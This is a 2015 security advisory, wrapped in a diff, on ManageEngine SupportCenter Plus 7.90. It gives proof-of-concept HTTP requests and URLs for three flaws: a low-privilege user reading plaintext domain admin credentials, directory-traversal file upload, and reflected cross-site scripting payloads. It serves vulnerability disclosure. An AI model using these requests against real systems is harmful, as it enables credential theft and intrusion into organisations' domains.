@@ -1,0 +1,301 @@
+Document Title:
+===============
+ManageEngine SupportCenter Plus 7.90 - Multiple Vulnerabilities
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1501
+
+
+Release Date:
+=============
+2015-06-19
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1501
+
+
+Common Vulnerability Scoring System:
+====================================
+6.9
+
+
+Product & Service Introduction:
+===============================
+SupportCenter Plus is a web-based customer support software that lets organizations effectively manage customer tickets, their account and 
+contact information, the service contracts and in the process providing a superior customer experience. SupportCenter Plus is commonly deployed on 
+internet accessible interfaces to allow customers to access the application. This common deployment scenario often involves a combination of 
+low privilege accounts for customers (typically local authentication) and higher privilege accounts for help desk stuff (typically Active Directory 
+integrated). Note that it is not unusual to allow any internet user to be able to register a low privilege account. This deployment scenario is 
+important to consider when evaluating the risk of the below vulnerabilities.
+
+(Copy of the Vendor Homepage: https://www.manageengine.com/products/support-center/ )
+
+
+Abstract Advisory Information:
+==============================
+An indepndent vulnerability researcher discovered multiple vulnerabilities in the official ManageEngine SupportCenter Plus v7.90 web-application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-05-27:	Researcher Notification & Coordination (Alain Homewood)
+2015-06-19:	Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Manage Engine
+Product: SupportCenter Plus - Web Application 7.90
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+1.1 Improper authentication disclosing password (Authenticated)
+Missing user access control mechanisms allow low privilege users to gain unauthorised access to sensitive Active Directory integration functionality normally only accessibly by Administrators. 
+This functionality allows a low privilege user to:
+1.) Retrieve the plain text user name and password for the domain account (typically Domain Administrator or similar) used to integrate with Active Directory
+2.) Configure arbitrary domains to be used for authentication and import users from these domains (overwriting existing user records)
+
+A low privilege user in SupportCenter Plus can gain privileged access to both the application and any integrated domains. Typical attack scenarios could include:
+1.) SupportCenter Plus is accessible via the internet. An internet based attacker who can gain access to a low privilege account (registering an account if enabled or stealing an account) can gain access to highly privileged domain credentials. The attacker can then use these credentials to gain remote access to the organisation through other means (e.g. VPNs or physically in a meeting room at the organisation).
+2.) SupportCenter Plus is not accessible via the internet. An attacker who has gained a low level of compromise in an organisation (i.e. any user who can access SupportCenter Plus) can use these vulnerabilities to escalate themselves to domain administrator or similar.
+
+Pre-requisites and considerations include:
+ - In order to steal existing domain credentials it is necessary for Active Directory integration to have been setup.
+ - In order to import users from an attacker controlled domain it is necessary for the SupportCenter Plus server to have network connectivity to the attacker server (i.e. firewall rules may prevent this)
+ - It is possible to login to SupportCenter Plus using domain authentication even when this option is hidden (typically done so that the domain name isn`t displayed on the internet accessible login)
+
+
+ 
+1.2 Directory traversal on file upload (Authenticated)
+Low privilege users have the ability to attach files to work order requests (e.g. to attach a screenshot). 
+This functionality is vulnerable to directory traversal and allows low privilege users to upload files to arbitrary directories.
+
+Potential impacts of this vulnerability include:
+1.) Remote code execution ***
+2.) Denial of service
+3.) Uploading malicious static content to web accessible directories (e.g. JavaScript, malware etc)
+
+*** There are two key limitations to this vulnerability that limit any easily exploitable method for code execution through exploiting the underlying JBoss environment:
+1.) A Java compiler is not installed as part of SupportCenter Plus which prevents uploaded JSP files from being executed
+2.) The uploaded directory always appends an additional directory (named after the user`s ID) which prevents deployment of a packaged or unpackaged WAR file (or similar)
+
+Despite the above limitations I cannot con conclusively determine that code execution is not possible.
+
+
+
+1.3 Reflected cross site scripting (Authenticated)
+Multiple authenticated reflected cross site scripting vulnerabilities exist in SupportCenter Plus.
+
+Unsanitised user provided input in the `query` parameter is echoed back to the user during requests to /CustomReportHandler.do.
+Only administrators (or similar highly privileged) users with access to the custom report functionality are vulnerable to this attack vector.
+
+Unsanitised user provided input in the `compAcct` parameter is echoed back to user during requests to /jsp/ResetADPwd.jsp.
+Unsanitised user provided input in the `redirectTo` parameter is echoed back to user during requests to /jsp/CacheScreenWidth.jsp.
+All authenticated users are vulnerable to these attack vectors.
+
+
+
+Proof of Concept (PoC):
+=======================
+1.1
+The vulnerability can be exploited by remote attackers without user interaction. 
+For security demonstration or to reproduce follow the provided information and steps below.
+
+Manual steps to reproduce the vulnerability ...
+1.) Set up a Active Directory domain
+2.) Install SupportCenter Plus
+3.) Login as an administrator and add a Windows domain and associated credentials
+4.) Logout and login as a low privilege user (by default there is guest/guest account)
+5.) Attempt to access the above URLs and observe that you can access the functionality with no restrictions
+(e.g. browse to http://[VULNERABLE]/EditDomain.do?action=editWindowsDomain&windowsDomainID=1&SUBREQUEST=XMLHTTP and view the password in the HTML source code)
+
+
+Plain text domain credentials can be viewed in the HTML source code of the following pages when logged in as low privilege user:
+http://[VULNERABLE]/EditDomain.do?action=editWindowsDomain&windowsDomainID=1&SUBREQUEST=XMLHTTP
+http://[VULNERABLE]/ImportADUsers.do
+
+Additional domains can be added through browsing to http://[VULNERABLE]/ImportADUsers.do?action=editWindowsDomain&windowsDomainID=1&SUBREQUEST=XMLHTTP and then selecting "Add New Domain" which will allow you to enter the domain details resulting in a POST similar to this:
+
+	POST /EditDomain.do?SUBREQUEST=XMLHTTP HTTP/1.1
+	Host: [VULNERABLE]
+	User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	X-Requested-With: XMLHttpRequest
+	Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+	Referer: http://[VULNERABLE]:9090/AdminHome.do
+	Content-Length: 181
+	Cookie: [object HTMLTableRowElement]=show; [object HTMLDivElement]=show; [object HTMLTableCellElement]=show; 3Adminhelpexp=helpexpshow; 3Adminhelpcoll=helpcollhide; JSESSIONID=C14EA9B74F5D5C7B2F3055EA96F71188; PREV_CONTEXT_PATH=; JSESSIONIDSSO=391CCA5D883203EBE1CD84BEFCB26144
+	Connection: keep-alive
+	Pragma: no-cache
+	Cache-Control: no-cache
+
+	name=TESTDOMAIN&isPublicDomain=on&domainController=CONTROLLER&loginName=Administrator&password=Password123&id=1&addButton=&cancel=Cancel&updateButton=Save&cancel=Cancel&description=
+
+Domain users can be imported by browsing to http://[VULNERABLE]/ImportADUsers.do selecting the domain and clicking next. You can then select the Operation Units (OUs) you want to import from the domain and click "Start Import" resulting in a POST similar to this:
+
+	POST /ImportADUsers.do HTTP/1.1
+	Host: [VULNERABLE]
+	User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Referer: http://[VULNERABLE]:9090/ImportADUsers.do
+	Cookie: [object HTMLTableRowElement]=show; [object HTMLDivElement]=show; [object HTMLTableCellElement]=show; PREV_CONTEXT_PATH=; JSESSIONID=96062390B861F5901A937CE3A71A8F4D; JSESSIONIDSSO=C5CBE9C1CB90CEA338318B903BEDE26A; 3Adminhelpexp=helpexpshow; 3Adminhelpcoll=helpcollhide
+	Connection: keep-alive
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 193
+	
+	selectedOUs=2&importUser=Start+Import&selectOUs=Next&serverName=CONTROLLER&domainName=TESTDOMAIN&userName=Administrator&userPassword=password123&isRefresh=true&phone=true&mobile=true&job=true&email=true
+
+
+
+1.2
+The vulnerability can be exploited by remote attackers without user interaction. 
+For security demonstration or to reproduce follow the provided information and steps below.
+
+Files are uploaded via a POST request to /workorder/Attachment.jsp?component=Request
+
+It is possible to manipulate the "module" parameters to traverse directories. Decompiled source code of the creation of the file path is shown below:
+	String filePath1 = "Attachments" + filSep + module + filSep + userID1
+
+Note that an additional directory (named after the user's ID) is always appended to file path.
+
+In the below example POST a module value of ../../../../../../../../../../../../ is specified and the logged in user has an ID value of 2.
+
+The resulting file in this case is uploaded to c:\2\payload.html on a Windows environment.
+
+
+An example POST request is shown below:
+	POST /workorder/Attachment.jsp?component=Request HTTP/1.1
+	Host: [VULNERABLE]:9090
+	User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Referer: http://[VULNERABLE]:9090/workorder/Attachment.jsp?component=Request
+	Cookie: [object HTMLTableRowElement]=show; [object HTMLDivElement]=show; [object HTMLTableCellElement]=show; PREV_CONTEXT_PATH=/custom; JSESSIONID=DCB297647A29281C4E80C76898B4B09A; 3Adminhelpexp=helpexpshow; 3Adminhelpcoll=helpcollhide; domainName=TESTDOMAIN; JSESSIONIDSSO=A1E2CBF658231DF263F84A994E27F536
+	Connection: keep-alive
+	Content-Type: multipart/form-data; boundary=---------------------------17390486101970088239358532669
+	Content-Length: 1110
+
+	-----------------------------17390486101970088239358532669
+	Content-Disposition: form-data; name="filePath"; filename="payload.html"
+	Content-Type: application/octet-stream
+
+	test12345
+
+	-----------------------------17390486101970088239358532669
+	Content-Disposition: form-data; name="filename"
+
+	payload.html
+	-----------------------------17390486101970088239358532669
+	Content-Disposition: form-data; name="vecPath"
+
+
+	-----------------------------17390486101970088239358532669
+	Content-Disposition: form-data; name="vec"
+
+
+	-----------------------------17390486101970088239358532669
+	Content-Disposition: form-data; name="theSubmit"
+
+	AttachFile
+	-----------------------------17390486101970088239358532669
+	Content-Disposition: form-data; name="formName"
+
+	null
+	-----------------------------17390486101970088239358532669
+	Content-Disposition: form-data; name="component"
+
+	../../../../../../../../../../../../
+	-----------------------------17390486101970088239358532669
+	Content-Disposition: form-data; name="ATTACH"
+
+	Attach
+	-----------------------------17390486101970088239358532669--
+
+
+	
+	
+1.3
+The cross site scripting web vulnerability can be exploited by remote attackers with low or medium user interaction. 
+For security demonstration or to reproduce follow the provided information and steps below.
+
+Administrator user only:
+http://[VULNERABLE]:9090/CustomReportHandler.do?module=run_query_editor_query&reportTitle=test&query=<BODY%20ONLOAD=alert(1)>
+
+Any authenticated user:
+http://[VULNERABLE]:9090/jsp/ResetADPwd.jsp?compAcct=%22%3E%3CIFRAME%20SRC=%22http://www.google.com%22%3E%3C/IFRAME%3E
+http://[VULNERABLE]:9090/jsp/CacheScreenWidth.jsp?width=1600&redirectTo=";alert(1);//
+
+
+Security Risk:
+==============
+1.1
+The security risk of the authentication disclosing password vulnerability is estimated as high. (CVSS 6.9)
+
+1.2
+The security risk of the directory traversal web vulnerability is estimated as high. (CVSS 5.9)
+
+1.3
+The security risk of the cross site scripting web vulnerabilities are estimated as medium. (CVSS 3.3)
+
+
+Credits & Authors:
+==================
+Alain Homewood (PwC New Zealand) - [http://vulnerability-lab.com/show.php?user=Alain%20Homewood]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
+
+
